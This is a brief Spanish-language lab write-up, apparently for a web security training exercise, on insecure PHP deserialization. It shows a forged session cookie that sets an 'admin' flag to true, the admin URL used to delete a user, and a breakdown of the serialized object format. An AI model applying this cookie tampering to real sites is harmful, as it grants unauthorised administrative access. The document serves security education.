---
title: "1 - Modifying serialized objects"
---

# 1 - Modifying serialized objects

```
https://0aaa00d203613df9802ffd8500b600ec.web-security-academy.net/admin/delete?username=carlos
```

```
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
```

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

Esta es una representación serializada en **PHP** de un objeto llamado `User`. Vamos a desglosarlo:

### **Explicación línea por línea**

```
O:4:"User":2
```

- `O` indica que es un **objeto**.
- `4:"User"` significa que el nombre de la clase es **`User`** y tiene 4 caracteres.
- `2` indica que el objeto tiene **2 propiedades**.

```
{s:8:"username";s:6:"wiener";
```

- `s:8:"username"`: Hay una propiedad llamada **`username`** con una longitud de 8 caracteres.
- `s:6:"wiener"`: Su valor es **"wiener"** y tiene una longitud de 6 caracteres.

```
s:5:"admin";b:1;}
```

- `s:5:"admin"`: Hay otra propiedad llamada **`admin`** con una longitud de 5 caracteres.
- `b:1`: Es un **booleano (`b`) con valor `1` (true)**, lo que indica que el usuario tiene permisos de administrador.

---
